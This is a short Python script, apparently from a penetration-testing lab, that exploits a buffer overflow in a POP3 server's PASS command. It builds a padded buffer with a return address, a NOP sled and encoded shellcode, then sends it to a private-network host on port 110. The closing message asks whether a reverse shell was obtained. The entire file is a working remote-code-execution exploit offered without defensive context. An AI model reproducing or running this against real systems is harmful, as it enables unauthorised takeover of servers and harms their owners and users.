#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xb8\xf3\xa7\x74\x70\xdd\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x83\xeb\xfc\x03\xb0\xa9\x96\x85\xca\x5e\xd4"
"\x66\x32\x9f\xb9\xef\xd7\xae\xf9\x94\x9c\x81\xc9\xdf\xf0\x2d"
"\xa1\xb2\xe0\xa6\xc7\x1a\x07\x0e\x6d\x7d\x26\x8f\xde\xbd\x29"
"\x13\x1d\x92\x89\x2a\xee\xe7\xc8\x6b\x13\x05\x98\x24\x5f\xb8"
"\x0c\x40\x15\x01\xa7\x1a\xbb\x01\x54\xea\xba\x20\xcb\x60\xe5"
"\xe2\xea\xa5\x9d\xaa\xf4\xaa\x98\x65\x8f\x19\x56\x74\x59\x50"
"\x97\xdb\xa4\x5c\x6a\x25\xe1\x5b\x95\x50\x1b\x98\x28\x63\xd8"
"\xe2\xf6\xe6\xfa\x45\x7c\x50\x26\x77\x51\x07\xad\x7b\x1e\x43"
"\xe9\x9f\xa1\x80\x82\xa4\x2a\x27\x44\x2d\x68\x0c\x40\x75\x2a"
"\x2d\xd1\xd3\x9d\x52\x01\xbc\x42\xf7\x4a\x51\x96\x8a\x11\x3e"
"\x5b\xa7\xa9\xbe\xf3\xb0\xda\x8c\x5c\x6b\x74\xbd\x15\xb5\x83"
"\xc2\x0f\x01\x1b\x3d\xb0\x72\x32\xfa\xe4\x22\x2c\x2b\x85\xa8"
"\xac\xd4\x50\x7e\xfc\x7a\x0b\x3f\xac\x3a\xfb\xd7\xa6\xb4\x24"
"\xc7\xc9\x1e\x4d\x62\x30\xc9\x78\x78\x3a\x5a\x15\x7c\x3a\x5d"
"\x5e\x09\xdc\x37\xb0\x5c\x77\xa0\x29\xc5\x03\x51\xb5\xd3\x6e"
"\x51\x3d\xd0\x8f\x1c\xb6\x9d\x83\xc9\x36\xe8\xf9\x5c\x48\xc6"
"\x95\x03\xdb\x8d\x65\x4d\xc0\x19\x32\x1a\x36\x50\xd6\xb6\x61"
"\xca\xc4\x4a\xf7\x35\x4c\x91\xc4\xb8\x4d\x54\x70\x9f\x5d\xa0"
"\x79\x9b\x09\x7c\x2c\x75\xe7\x3a\x86\x37\x51\x95\x75\x9e\x35"
"\x60\xb6\x21\x43\x6d\x93\xd7\xab\xdc\x4a\xae\xd4\xd1\x1a\x26"
"\xad\x0f\xbb\xc9\x64\x94\xcb\x83\x24\xbd\x43\x4a\xbd\xff\x09"
"\x6d\x68\xc3\x37\xee\x98\xbc\xc3\xee\xe9\xb9\x88\xa8\x02\xb0"
"\x81\x5c\x24\x67\xa1\x74")

buffer = 'A'* 2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 +  shellcode + "C" * (3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.23.184',110)) 	# connect to IP, POP3 port
	data = s.recv(1024) 		# receive banner
	s.send('USER test' +'\r\n') 	# send username "test"
	data = s.recv(1024)		# receive reply
	s.send('PASS '+ buffer+'\r\n') 	# send password "test"
	s.close()
	print "\nDone. Did you get a reverse shell?"

except:
	print "Could not connect to POP3!"
